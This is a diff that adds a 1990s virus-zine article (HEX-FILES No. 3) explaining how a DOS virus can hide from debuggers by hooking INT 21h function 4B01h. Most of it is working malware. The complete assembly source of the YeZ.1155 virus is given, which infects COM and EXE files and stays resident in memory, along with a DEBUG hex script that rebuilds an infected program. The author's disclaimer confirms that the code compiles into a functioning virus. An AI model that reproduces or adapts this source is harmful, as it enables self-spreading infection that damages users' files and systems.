@@ -1,0 +1,1005 @@
+ 
+  HEX-FILES No. 3                                                   File 002
+ 袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴袴 
+ 
+                         4B01h/21h Stealthing Overview 
+                                        
+                                    by: YeZ 
+ 
+                               yez@rocketmail.com
+ 
+ 
+ 
+  All these years, virus programmers used the 4B00h/21h (load and execute 
+  program) as a trigger for infection. Why not use another DOS executing 
+  function -- 4B01h/21h (load without executing). This function is used by 
+  debuggers, such as DEBUG, TD (Turbo Debugger), Softice and other debuggers 
+  to load a program. Intercepting this DOS function enables the virus to hide 
+  itself when a debugger is being used.
+ 
+  Here's a step by step guide on how to do this:
+ 
+  1.  First of all we should save the ES:BX, DS:DX in our virus code before 
+      calling the routine because all registers are considered destroyed on 
+      return. ES:BX points to the execution parameter of the program to be 
+      executed and DS:DX points to the name of the program to be executed.
+ 
+      ***
+        mov   word ptr cs:[es_bx],bx       ;Save offset of EXEC parameter
+        mov   word ptr cs:[es_bx+2],es     ;Save Segment of EXEC parameter
+        mov   word ptr cs:[ds_dx],dx       ;Save offset of EXEC filename
+        mov   word ptr cs:[ds_dx+2],ds     ;Save segment of EXEC filename
+ 
+ 
+  2.  After saving all the vital data, call the original INT 21h.
+ 
+      ***
+        call   _i21_call                  ;Call INT 21h
+ 
+        .
+        .
+        .
+ 
+      _i21_call:
+        pushf
+        call   cs:[i21]        ; Contains the original seg:off of INT 21h
+        ret
+ 
+ 
+  3.  After executing the original INT 21h, save all registers, segments and 
+      all those garbage, so that the calling debugger would not notice 
+      something fishy is going on. Failing to do this would hang the debugger 
+      program.
+ 
+      ***
+        call   _pusha                    ;Push all Registers !!!
+        ^
+        This sub-module will save all registers and segments.
+ 
+ 
+  4.  After saving all registers, we have to check the program if it is 
+      infected by our virus. In our demo, we used the date as our infection 
+      marker. If the marker is not found (uninfected program) then jump to 
+      step 7. :(
+ 
+      Note: You can hook to the infection routine to infect the program, if it 
+            is not infected. I didn't do it here in our demo because you are 
+            supposed to do it yourself.... :)
+ 
+      ***
+      _debug_routine:
+        lds   dx,cs:[ds_dx]           ;Use saved DS:DX filename
+        xor   al,al                   ;Open file...
+        call  _open_file              ;_open_file()
+        jc    out_debug_routine       ;On error out_debug_routine
+        mov   ax,5700h                ;Get file time/date...
+        call  _i21_call               ;Call real INT 21h
+        call  _close_file             ;Close file now...
+        cmp   dx,24cch                ;CMP virus marker ... ?
+        je    ok_disinfect            ;If virus marker found then continue.
+        jmp   out_debug_routine       ;If not virus marker then go out...
+ 
+ 
+  5.  If the marker is present, the next thing to do is determine the type of 
+      program being infected. In our case, a program which starts with E9h 
+      (JMP XXXX) is assumed to be a COM program. Otherwise, it is considered 
+      an EXE :)
+ 
+      ***
+      ok_disinfect:
+        les   di,cs:[es_bx]             ;Load EXEC parameters to ES:DI.
+        lds   si,dword ptr es:[di+18]   ;Load CS:IP of debugged program.
+        push  ds                        ;{ Load DS:SI = ES:DI
+        pop   es                        ;  this is the CS:IP of the debugged
+        mov   di,si                     ;  program... }
+        cld                             ;Clear Direction flag AY!
+        lodsb                           ;Lode byte to AL
+        cmp   al,0e9h                   ;CMP it with 0E9H = "JMP displacement"
+        jne   exe_file_debug            ;!= then it is an EXE program.
+ 
+ 
+  6.A We are assuming that the infected program is a COM. We should return all 
+      original data to the entry point of the COM program, by moving it 
+      towards the program's entry point. The debugger will now be viewing the 
+      original entry point of the program before the infection, effectively 
+      disinfecting it. All COM entry point is always at offset 100h :)
+ 
+      ***
+      com_file_debug:
+        lodsw                            ; Load "offset" to AX
+        add   ax,3                       ; Add 3 to adjust with 0e9,??,??
+        add   ax,di                      ; to get the delta offset
+        mov   bp,ax                      ; move AX to BP
+        lea   si,vir_data[bp]            ; Load the data
+        mov   cx,header_end - header     ; number of bytes to move...
+        rep   movsb                      ; move it now...
+        jmp   out_debug_routine          ; Get out ta here will ya! hehehehe!
+ 
+  6.B We are assuming that the infected program is an EXE. In this case, we 
+      are not returning any data by moving it towards the program entry point 
+      instead we will be calculating the uninfected entry point address of the 
+      program before the infection. This will also effectively disinfected 
+      infected EXE program, by means of returning the  program's entry point 
+      to its original uninfected state. (We will be doing some MATH here... :) 
+      )
+ 
+      We are assuming that the infected program is an EXE. In this case, we 
+      would not be moving any host data but we would have to calculate the 
+      original entry point address of the program. Unlike COMs, EXEs entry 
+      point could be located anywhere in the program. By restoring the 
+      program's entry point to its original uninfected state would also 
+      effectively disinfected EXE program, . (We will be doing some MATH 
+      here... :) )
+ 
+      ***
+      exe_file_debug:
+        mov   bp,di                     ; Put DI to BP to serve as delta
+        lea   si,vir_data[bp]           ; Load SI debug program vir_data[BP]
+        add   si,0eh                    ; To direct towards SS:SP data.
+        cld                             ; Of coz clear direct...
+        lodsw                           ; Load SS displacement to AX
+        xchg  ax,cx                     ; Save it in CX
+        add   si,6                      ; To direct towards CS:IP data.
+        lodsw                           ; Load CS displacemet to AX
+        xchg  ax,dx                     ; Save it in DX
+        lodsw                           ; This is just to adjust You'll see.
+        les   bx,cs:[es_bx]             ; Load ES:BX(environtment parameter)
+        lodsw                           ; Load uninfected SS displacement
+        sub   cx,ax                     ; Subtract it with the infected one.
+        sub   word ptr es:[bx+14+2],cx  ; Update SS in the parameter
+        lodsw                           ; Load uninfected SP offset
+        dec   ax                        ; { Decrement it twice to adjust to
+        dec   ax                        ; the stack }
+        mov   word ptr es:[bx+14],ax    ; Update SP in the parameter
+        lodsw                           ; Load Uninfected IP
+        mov   word ptr es:[bx+18],ax    ; Update IP in the parameter
+        lodsw                           ; Load uninfected CS
+        sub   dx,ax                     ; Subtract it with the infected one.
+        sub   word ptr es:[bx+18+2],dx  ; Update CS in the parameter
+ 
+      out_debug_routine:                 ; Terminal end-point!!!
+ 
+ 
+  7.  We should POP out all the saved registers and segments then return to 
+      the program (debugger) which called the 4B01h/21h routine. (This is the 
+      last thing we should do).
+ 
+      ***
+        call    _popa                     ;Pop all Register !!!
+        iret                              ;Return to calling module...
+ 
+ 
+  The demo virus is found below this document. And please read the disclaimer 
+  of the demo virus being presented. 
+ 
+  I hope you enjoyed and understood this article and the demo virus. Because 
+  if you didn't then I'm truly screwed...!!! Please forgive me for any wrong 
+  grammar, program bug, or anything misleading found in this article. 
+ 
+  If you have any comments, suggestions, insults, questions, or absolutely 
+  anything, send it to 
+ 
+                              YeZ@rocketmail.com.
+ 
+ 
+ 컴 YEZ1155.ASM STARTS HERE 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴� 
+ 
+ ;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
+ ;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
+ ;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴� HEX-FILES No 3 컴�
+ ;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
+ ;컴컴�  Virus Name: YeZ.1155                    컴컴컴컴컴컴컴컴컴컴컴컴컴�
+ ;컴컴�  Author    : YeZ                         컴컴컴컴컴컴컴컴컴컴컴컴컴�
+ ;컴컴�  Origin    : Zamboanga City, Philippines 컴컴컴컴컴컴컴컴컴컴컴컴컴�
+ ;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
+ ;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
+ ;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
+ ;
+ ;           Virus which demonstrate 4B01h/21h stealthing by: YeZ
+ ;
+ ;
+ ; Virus Characteristics:
+ ;
+ ; File Infection: COM & EXE (except COMMAND.COM & WIN(EXE) or Compressed(EXE))
+ ; Stealth: 4B01h Stealth...
+ ; Polymorphicity: NOP...
+ ; Encryption: NOP...
+ ; Tunneling: NOP..
+ ; Payload: NOP...
+ ; Unoptimized...
+ ; (8^[)
+ ; ...
+ ;
+ ; This virus has no special features, no fancy tricks, it only demonstrates
+ ; 4B01h/21h (debugging stealth). This virus will not infect programs that are
+ ; write protected, hidden, or system. Therefore write protect all vital 
+ ; programs before testing this virus...
+ ;
+ ; Disclaimer:
+ ; This is a complete executable virus when compiled, the author and the
+ ; zine is not responsible for any damage caused by this program, *use at your
+ ; own risk*, IF YOU DO NOT KNOW HOW TO HANDLE COMPUTER VIRUSES BETTER NOT 
+ ; COMPILE THIS ONE...!!!
+ ;
+ ; Greetz:
+ ;     PhVx: Keep up the good work "PsK are you alone in this zine?"
+ ;     Putoksa Kawayan: Great Job for the PhVx!!!
+ ;     Mikee: "Jesus saves!!!"
+ ;     Jonjon Gumba: Possessed! Bha!ha!ha!ha! how is that for an introduction?
+ ;     Lyndon Xiao: is being Smitten by XTaC :)
+ ;     OGGO: write some more graphic viruses!!!
+ ;     XED: Lord of all nightmares!!!
+ ;     Luis Sarmenta: Vir-X shall I say is alright??? :)
+ ;     All Vx & Av of the Philippines and abroad "peace and be wild...!!!"
+ ;
+ ; Foriegn Greetz:
+ ;    Darkman: Thanx for sending me the 29A-2 & your staff, it was great man!
+ ;    Urgo32: A tout le monde "tell me what this means :)"
+ ;    Buzzo: Thanx for your text at least you really wanted me to learn...
+ ;    LovinGod: Thanx 4 the PGP thing, "hey where is my TASM 4.0? hehehe:)"
+ ;    SuperX: Buenas dias amigo!!! "I don't know proper spanish :("
+ ;    Yesna: Our IRC sucks that's why I cannot visit the #virus until now :(
+ ;    Vdaemon: Thanx for the Op man long live #vir hehehehe!!! :)
+ ;    CyberYoda: I missed you on IRC #virus & #vir
+ ;    Slumdung: Hiya there my asian friend...
+ ;    Owl[FS]/Methyl: Tell me about super virus... :)
+ ;    Wolfman: Don't eat me. :)
+ ;    StealthWarrior: Thanx for your .EXE file infection. :)
+ ;    All of you in the Vx scene...
+ ;
+ ;    And last but not the least *YOU* the reader "If I have any?"
+ ;    You know who you are you fucken' rule...  -Pantera- :)
+ ;
+ ;                                              From: YeZ
+ ;
+ ;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
+ ;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
+ ;
+ ; This source code could be compiled in TASM 2.01 without problem.
+ ;
+ ; When compiled in MASM 5.0, it will generate a "phase error" message. If 
+ ; you would still insist on using MASM, you would have to fix the problem.
+ ;
+ ; This can be compiled in A86 4.02 but remember that A86 generates different 
+ ; opcodes for some instructions, that is, in comparison to TASM and MASM. 
+ ; 
+ ;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
+ ;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
+ 
+         .model  small
+         .code
+ 
+                 org     0
+ 
+ YeZ     segment
+ 
+         assume  cs:YeZ,ds:YeZ,es:YeZ
+ 
+ start_vir:      ;Marks the beginning code delta.
+ 
+         call    _do_delta      ; Set virus routine
+         int     3              ; Call virus routine
+ 
+ _do_delta:
+         mov     bp,sp
+         mov     bp,[bp]
+         sub     bp,3
+         push    ds
+         xor     ax,ax
+         mov     ds,ax
+         mov     bx,03*4
+ 
+         push    [bx]
+         pop     word ptr cs:[i21][bp]
+         push    [bx+2]
+         pop     word ptr cs:[i21+2][bp]
+         lea     ax,_do_infect_ram[bp]
+ 
+         cli
+         mov     [bx],ax
+         mov     [bx+2],cs
+         sti
+ 
+         pop     word ptr cs:[ds_to_safe][bp]
+ 
+         ret
+ 
+ _do_infect_ram:
+         cli
+         push    word ptr cs:[i21+2][bp]
+         pop     [bx+2]
+         push    word ptr cs:[i21][bp]
+         pop     [bx]
+         sti
+ 
+         mov     ax,0000
+ ds_to_safe      equ     $ - 2
+         mov     ds,ax
+ 
+ _jump_here_after_ram_infect:
+         push    cs
+         mov     ax,0feefh          ;Check virus presence. If present
+         int     21h                ;then the virus will immediately
+                                    ;Jump to the host program instead of 
+                                    ;proceeding to the next instruction in 
+                                    ;this Vx code  :)
+         pop     ax
+         push    ds
+         push    es
+         mov     ah,4ah                 ; Let the program allocate all the
+         xor     bx,bx                  ; memory present in your system...
+         not     bx                     ; by putting 0FFFFH in BX
+         int     21h
+ 
+         mov     ah,4ah                         ;Subtract total virus size*2+3
+         sub     bx,((end_vir-start_vir)/16)+3  ;paragraphs from the total 
+         int     21h                            ;memory and resize allocated 
+                                                ;memory.
+ 
+         mov     ah,48h                         ;Allocate that free memory 
+         mov     bx,((end_vir-start_vir)/16)+2  ;subtracted from the above 
+         int     21h                            ;routine have I given you a 
+                                                ;clue... :)
+         push    ax
+         dec     ax
+         push    ax
+         pop     ds
+ 
+         mov     byte ptr ds:[0],'Z'     ;Mark allocated memory as last.
+         mov     word ptr ds:[1],8       ;Mark the allocated memory to be 
+                                         ;owned by DOS.
+         push    cs
+         pop     ds
+         pop     es
+ 
+         mov     si,bp
+         xor     di,di
+         mov     cx,end_vir-start_vir
+         cld
+         rep     movsb                ;Copy the virus to the allocated memory.
+ 
+         xor     ax,ax
+         mov     ds,ax
+         mov     bx,21h*4
+         mov     ax,[bx]
+         mov     word ptr es:[i21],ax
+         mov     ax,[bx+2]
+         mov     word ptr es:[i21+2],ax   ;Get INT 21h
+ 
+         lea     ax,_vir_int21            ;Link INT 21h to our VIRUS :)
+         cli
+         mov     [bx],ax
+         mov     [bx+2],es
+         sti
+ 
+         pop     es
+         pop     ds
+         jmp     _jump_here_after_ram_infect  ;Do I need to comment this one??
+ 
+ _vir_int21:
+         cmp     ax,4b00h           ;Load and Execute program routine
+         je      _infect_file
+         cmp     ax,4b01h           ;Load w/o Executing (this is our target)
+         jne     chk_presence
+         jmp     _stealth_debug
+ chk_presence:
+         cmp     ax,0feefh          ;Check for presence :)
+         jne     _jmp_to_int21
+         jmp      _ret_to_prog
+ 
+ _jmp_to_int21:
+         db      0eah
+ i21     dd      0
+ 
+ _infect_file:                   ;The infection routine of the virus...
+         call    _pusha          ;Push all registers
+         call    _set_up_ints    ;Reset INTs (23h & 24h)
+ 
+         call    _set_up_file    ;Setup the file
+         jc      out_infect_file
+         call    _infect_file_now     ;YAY!!!!
+         jc      close_now
+         call    _put_marker          ; Try to see the marker... :)
+ 
+ close_now:
+         call    close_set_up_file    ;Close the file damnit!!!
+ 
+ out_infect_file:
+         call    _ret_up_ints   ;Return reset INTs
+         call    _popa          ;Pop all registers
+         jmp     _jmp_to_int21  ;Do I need to elaborate on this one?
+ 
+ _set_up_ints:                   ;Revector INT 23h and 24h
+         push    ds
+         xor     ax,ax
+         mov     ds,ax
+         mov     bx,24h*4
+         push    [bx]
+         push    [bx+2]
+         pop     word ptr cs:[i24+2]
+         pop     word ptr cs:[i24]
+         lea     ax,_i24
+         cli
+         mov     [bx],ax
+         mov     [bx+2],cs
+         sti
+         sub     bx,4
+         push    [bx]
+         push    [bx+2]
+         pop     word ptr cs:[i23+2]
+         pop     word ptr cs:[i23]
+         lea     ax,_i23
+         cli
+         mov     [bx],ax
+         mov     [bx+2],cs
+         sti
+         pop     ds
+ 
+         ret
+ 
+ _ret_up_ints:                   ;Return INT 23h and 24h
+         push    ds
+         xor     ax,ax
+         mov     ds,ax
+         mov     bx,23h*4
+         push    word ptr cs:[i23+2]
+         push    word ptr cs:[i23]
+         cli
+         pop     [bx]
+         pop     [bx+2]
+         sti
+         add     bx,4
+         push    word ptr cs:[i24+2]
+         push    word ptr cs:[i24]
+         cli
+         pop     [bx]
+         pop     [bx+2]
+         sti
+         pop     ds
+ 
+         ret
+ 
+ _set_up_file:           ;Setting up file to infect...
+ 
+         mov     al,2
+         call    _open_file
+         jc      out_set_up_file
+         call    _sft_
+         jnc     out_set_up_file
+         call    close_set_up_file
+         stc
+ 
+         ret
+ 
+ close_set_up_file:
+         call    _close_file
+ out_set_up_file:
+         ret
+ 
+ _sft_:                                ;SFT functions this is very powerful 
+         push    bx                    ;when used properly.
+         mov     ax,1220h
+         push    ax
+         int     2fh
+         jc      out_sft
+         mov     bl,byte ptr es:[di]
+         cmp     bl,0ffh
+         je      str_sft
+         pop     ax
+         sub     al,0ah
+         int     2fh
+         test    byte ptr es:[di+4],111b    ;Check file Attribute?
+                                            ;111b = system,hidden,read/only!!!
+         jnz     str_sft                    ;if so do not infect...
+ 
+         cmp     word ptr es:[di+0fh],24cch   ;Check date with our marker...?
+         je      str_sft                      ;if equal do not infect...
+ 
+         add     di,20h                     ;Check filename to be COMMAND.COM
+         mov     si,offset command
+         mov     cx,11
+         push    cs
+         pop     ds
+         cld
+         rep     cmpsb
+         je      str_sft                      ;if so do not infect...
+         clc
+         jmp     out_sft
+ str_sft:
+         stc
+ out_sft:
+         pop     bx
+         ret
+ 
+ _infect_file_now:
+         mov     cx,header_end - header
+         mov     dx,offset vir_data
+         call    _read_file
+ 
+         mov     si,dx
+         cld
+         lodsw
+         xor     ah,al
+         cmp     ah,'M' xor 'Z'
+         je      _exe_file_to_infect
+ 
+         mov     byte ptr cs:[host_type],'C'  ;Put COM Marker...
+         mov     al,2
+         call    _move_pointer
+         cmp     ax,80h                  ;Don't infect COM below 128 bytes...
+         jnb     good_com_size
+         stc
+         jmp     out_infect_file_now
+ good_com_size:
+         sub     ax,3
+         mov     word ptr cs:[jmp_vir],ax
+         call    _writing_the_virus
+         jnc     cont_com_infect
+         jmp     out_infect_file_now
+ cont_com_infect:
+         mov     cx,header_end - header
+         mov     dx,offset header
+         call    _write_file
+         ret
+ 
+ _exe_file_to_infect:
+         cmp     byte ptr [vir_data+18h],40h  ;NewEXE
+         jb      exe_is_a_dos_ok              ;If below 40h then DOS(exe)
+         stc
+         jmp     out_infect_file_now
+ 
+ exe_is_a_dos_ok:
+         mov     byte ptr cs:[host_type],'E'  ;Put EXE marker...
+         mov     cx,1ah
+         push    cx
+         push    bx
+ 
+         mov     al,2
+         call    _move_pointer
+         push    dx
+         push    ax
+ 
+         push    cs
+         pop     es
+         mov     cx,2
+         lea     di,vir_data
+         mov     si,di
+         add     di,1ah
+         add     si,0eh
+         push    cx
+         cld
+         rep     movsw
+         pop     cx
+         add     si,cx
+         rep     movsw
+         mov     ax,word ptr [vir_data+8]
+         mov     cl,4
+         shl     ax,cl
+         mov     bx,ax
+         pop     ax
+         pop     dx
+         push    dx
+         push    ax
+         sub     ax,bx
+         sbb     dx,0
+         mov     cx,10h
+         div     cx
+         mov     word ptr [vir_data+14h],dx
+         mov     word ptr [vir_data+16h],ax
+         mov     word ptr [vir_data+0eh],ax
+         mov     word ptr [vir_data+10h],'FY'
+         pop     ax
+         pop     dx
+         add     ax,end_vir - start_vir
+         adc     dx,0
+         mov     cl,9
+         push    ax
+         shr     ax,cl
+         ror     dx,cl
+         stc
+         adc     dx,ax
+         pop     ax
+         and     ah,1
+         mov     word ptr [vir_data+4],dx
+         mov     word ptr [vir_data+2],ax
+         pop     bx
+         call    _writing_the_virus
+         jc      out_infect_file_now
+         lea     dx,vir_data
+         pop     cx
+         call    _write_file
+ 
+ out_infect_file_now:
+         ret
+ 
+ _writing_the_virus:
+         xor     dx,dx
+         mov     cx,end_vir-start_vir
+         call    _write_file
+         cmp     ax,cx
+         je      ok_to_write_vir
+         stc
+         jmp     out_writing_the_virus
+ ok_to_write_vir:
+         xor     al,al
+         call    _move_pointer
+         clc
+ out_writing_the_virus:
+         ret
+ 
+ _put_marker:
+         mov     ax,5700h        ;Get date
+         call    _i21_call
+         inc     al              ;Set date
+         mov     dx,24cch        ;Put marker date see it for yourself :)
+         call    _i21_call
+ 
+         ret
+ 
+ _open_file:                     ;Open file routine
+         mov     ah,3dh
+         call    _i21_call
+         xchg    bx,ax
+         cmp     bx,5
+         jnb     clr_to_open
+         stc
+         jmp     out_open_file
+ clr_to_open:
+         clc
+ out_open_file:
+         ret
+ 
+ _read_file:                     ;read file routine
+         mov     ah,3fh
+         call    _i21_call
+         ret
+ 
+ _write_file:                    ;write file routine
+         mov     ah,40h
+         call    _i21_call
+         ret
+ 
+ _move_pointer:                  ;file pointer routine
+         xor     cx,cx
+         xor     dx,dx
+         mov     ah,42h
+         call    _i21_call
+         ret
+ 
+ _close_file:                    ;close file routine
+         mov     ah,3eh
+         call    _i21_call
+         ret
+ 
+ _i21_call:
+         pushf
+         call    cs:[i21]
+         ret
+ 
+ ; ******************************************
+ ; This is will be our routine... :) enjoy!!!
+ ; ******************************************
+ _stealth_debug:
+ 
+         mov     word ptr cs:[es_bx],bx      ;Save offset of EXEC parameter
+         mov     word ptr cs:[es_bx+2],es    ;Save Segment of EXEC parameter
+         mov     word ptr cs:[ds_dx],dx      ;Save offset of EXEC filename
+         mov     word ptr cs:[ds_dx+2],ds    ;Save segment of EXEC filename
+         call    _i21_call                   ;Call INT 21h
+         call    _pusha                      ;Push all Register !!!
+         call    _debug_routine              ;Call our routine ;)
+         call    _popa                       ;Pop all Register !!!
+         iret                                ;Return to calling module...
+ 
+ _debug_routine:
+         lds     dx,cs:[ds_dx]           ;Use the saved DS:DX filename
+         xor     al,al                   ;Open file...
+         call    _open_file              ;_open_file()
+         jc      out_debug_routine       ;On error out_debug_routine
+         mov     ax,5700h                ;Get file time/date...
+         call    _i21_call               ;Call real INT 21h
+         call    _close_file             ;Close file now...
+         cmp     dx,24cch                ;CMP virus marker ... ?
+         je      ok_disinfect            ;If virus marker found then continue.
+         jmp     out_debug_routine       ;If virus marker then go out...
+ 
+ ok_disinfect:
+         les     di,cs:[es_bx]            ;Load EXEC parameters to ES:DI.
+         lds     si,dword ptr es:[di+18]  ;Load CS:IP of debugged program.
+         push    ds                       ;{ Load DS:SI = ES:DI
+         pop     es                       ;  this is the CS:IP of the debugged
+         mov     di,si                    ;  program... }
+         cld                              ; Clear Direction flag AY!
+         lodsb                            ; Lode byte to AL
+         cmp     al,0e9h                  ; CMP it with 0E9H = "JMP offset"
+         jne     exe_file_debug           ; != then it is an EXE program.
+ com_file_debug:
+         lodsw                           ; Lode "offset" to AX
+         add     ax,3                    ; Add 3 to adjust with 0e9,??,??
+         add     ax,di                   ; to get the delta offset
+         mov     bp,ax                   ; move AX to BP
+         lea     si,vir_data[bp]         ; Load the data
+         mov     cx,header_end - header  ; number of bytes to move...
+         rep     movsb                   ; move it now...
+         jmp     out_debug_routine       ; Get out ta here will ya!
+ 
+ ;  Then we are set for hiding the virus in the COM program when someone is 
+ ;  debugging it...
+ ;       isn't it simple ... :)
+ 
+ exe_file_debug:
+         mov     bp,di                    ; Put DI to BP to serve as delta
+         lea     si,vir_data[bp]          ; Load SI debug program vir_data[BP]
+         add     si,0eh                   ; To direct towards SS:SP data.
+         cld                              ; Of coz clear direct...
+         lodsw                            ; Load SS displacement to AX
+         xchg    ax,cx                    ; Save it in CX
+         add     si,6                     ; To direct towards CS:IP data.
+         lodsw                            ; Load CS displacemet to AX
+         xchg    ax,dx                    ; Save it in DX
+         lodsw                            ; This is just to adjust You'll see.
+         les     bx,cs:[es_bx]            ; Load ES:BX(environtment parameter)
+         lodsw                            ; Load uninfected SS displacement
+         sub     cx,ax                    ; Subtract it with the infected one.
+         sub     word ptr es:[bx+14+2],cx ; Update SS in the parameter
+         lodsw                            ; Load uninfected SP offset
+         dec     ax                       ; { Decrement it twice to adjust to
+         dec     ax                       ; the stack }
+         mov     word ptr es:[bx+14],ax   ; Update SP in the parameter
+         lodsw                            ; Load Uninfected IP
+         mov     word ptr es:[bx+18],ax   ; Update IP in the parameter
+         lodsw                            ; Load uninfected CS
+         sub     dx,ax                    ; Subtract it with the infected one.
+         sub     word ptr es:[bx+18+2],dx ; Update CS in the parameter
+ 
+ ;  Then we are set for hiding the virus in the EXE program when someone is 
+ ;  debugging it...
+ ;       isn't it simple ... :)
+ 
+ out_debug_routine:
+ 
+         ret
+ 
+ 
+ _ret_to_prog:
+         add     sp,6
+         pop     ds
+         cmp     byte ptr [host_type][bp],'C'  ;Checking host type?
+         jne      _exe_host_to_ret
+ 
+ _com_host_to_ret:               ;COM program return to host program...
+         lea     si,vir_data[bp]
+         mov     di,100h
+         push    di
+         mov     cx,header_end - header
+         cld
+         rep     movsb
+         pop     di
+         push    bp
+         mov     bp,sp
+         mov     [bp+2],di
+         pop     bp
+         jmp     out_from_ret
+ 
+ _exe_host_to_ret:
+         lea     si,vir_data+1ah[bp]
+         xor     dh,dh
+         call    _adjust_exe_proc
+         cli
+         mov     sp,ax
+         mov     ss,bx
+         sti
+         inc     dh
+         call    _adjust_exe_proc
+         mov     cx,word ptr [ds_to_safe][bp]
+         mov     ds,cx
+ 
+         pushf
+         push    ax
+         push    bx
+ 
+ out_from_ret:
+         iret
+ 
+ _adjust_exe_proc:
+         mov     cx,es
+         lodsw
+         cmp     dh,1
+         je      this_cs_ip
+         call    _add_segment_exe
+ this_cs_ip:
+         xchg    ax,bx
+         lodsw
+         cmp     dh,1
+         jne     out_adjust_exe_proc
+ _add_segment_exe:
+         add     ax,cx
+         add     ax,10h
+ 
+ out_adjust_exe_proc:
+         ret
+ 
+ _i24:                           ;Virus INT 24h
+         mov     al,3
+         stc
+ _i23:                           ;Virus INT 23h
+         iret
+ 
+ _pusha:                 ; Routine to PUSH all registers and segments...
+         pop     cs:[pp]
+         pushf
+         push    ax
+         push    bx
+         push    cx
+         push    dx
+         push    di
+         push    si
+         push    ds
+         push    es
+         push    bp
+         jmp     cs:[pp]
+ 
+ _popa:                  ; Routine to POP all registers and segments...
+         pop     cs:[pp]
+         pop     bp
+         pop     es
+         pop     ds
+         pop     si
+         pop     di
+         pop     dx
+         pop     cx
+         pop     bx
+         pop     ax
+         popf
+         jmp     cs:[pp]
+ 
+ 
+ pp      dw      0
+ host_type db    'C'
+ header    db    0E9H
+ jmp_vir   dw    0
+           db    13,'YeZ =PhVx= Article virus (demonstration purposes only)...'
+           db    13,10,1ah
+ header_end      equ     $
+ command   db    'COMMAND COM'
+ vir_data  db    0CDH,20H,90H,(header_end - header) dup (90h)
+ 
+ es_bx     dd      0     ;This is our routine variable ES:BX
+ ds_dx     dd      0     ;This is our routine variable DS:DX
+ i23       dd      0
+ i24       dd      0
+ 
+ end_vir:
+ 
+ YeZ     ends
+ 
+                 end
+ 
+ 
+ 컴 YEZ1155.ASM ENDS HERE 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴� 
+ 
+ 
+ This is a file infected by the compiled demo virus above courtesy of YeZ.
+ Source code was compiled in TASM 2.01. 
+ 
+ Have fun... and care! 
+ 
+ 
+ 컴 YEZ1155.SCR STARTS HERE 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴� 
+ 
+ N YEZ1155.COM
+ E 0100  E9 CA 01 0D 59 65 5A 20 3D 50 68 56 78 3D 20 41 
+ E 0110  72 74 69 63 6C 65 20 76 69 72 75 73 20 28 64 65 
+ E 0120  6D 6F 6E 73 74 72 61 74 69 6F 6E 20 70 75 72 70 
+ E 0130  6F 73 65 73 20 6F 6E 6C 79 29 2E 2E 2E 0D 0A 1A 
+ E 0140  65 20 50 68 69 6C 69 70 70 69 6E 65 73 2E 0D 0A 
+ E 0150  42 72 6F 75 67 68 74 20 74 6F 20 79 6F 75 20 6C 
+ E 0160  69 76 65 20 62 79 20 48 45 58 2D 46 49 4C 45 53 
+ E 0170  20 4E 6F 2E 20 33 0D 0A 0A 48 45 58 2D 46 49 4C 
+ E 0180  45 53 20 61 6E 64 20 59 65 5A 20 61 72 65 20 6E 
+ E 0190  6F 74 20 72 65 73 70 6F 6E 73 69 62 6C 65 20 66 
+ E 01A0  6F 72 20 61 63 74 75 61 6C 2C 20 69 6D 70 6C 69 
+ E 01B0  65 64 20 61 6E 64 2F 6F 72 20 69 6D 61 67 69 6E 
+ E 01C0  61 72 79 20 0D 0A 64 61 6D 61 67 65 20 61 72 69 
+ E 01D0  73 69 6E 67 20 64 69 72 65 63 74 6C 79 20 6F 72 
+ E 01E0  20 69 6E 64 69 72 65 63 74 6C 79 20 66 72 6F 6D 
+ E 01F0  20 74 68 65 20 75 73 65 2C 20 6D 69 73 75 73 65 
+ E 0200  20 6F 72 20 6E 6F 6E 2D 75 73 65 20 6F 66 20 74 
+ E 0210  68 69 73 0D 0A 70 72 6F 67 72 61 6D 2E 20 54 68 
+ E 0220  65 20 70 65 72 73 6F 6E 20 77 68 6F 20 65 78 65 
+ E 0230  63 75 74 65 73 20 74 68 69 73 20 70 72 6F 67 72 
+ E 0240  61 6D 20 62 65 61 72 73 20 66 75 6C 6C 20 72 65 
+ E 0250  73 70 6F 6E 73 69 62 69 6C 69 74 79 20 66 6F 72 
+ E 0260  0D 0A 68 69 73 2F 68 65 72 20 61 63 74 69 6F 6E 
+ E 0270  73 2E 0D 0A 0A 54 68 69 73 20 70 72 6F 67 72 61 
+ E 0280  6D 20 69 73 20 73 74 72 69 63 74 6C 79 20 66 6F 
+ E 0290  72 20 65 64 75 63 61 74 69 6F 6E 61 6C 20 6F 72 
+ E 02A0  20 72 65 73 65 61 72 63 68 20 70 75 72 70 6F 73 
+ E 02B0  65 73 20 6F 6E 6C 79 2E 0D 0A 0A 0A 24 08 20 1A 
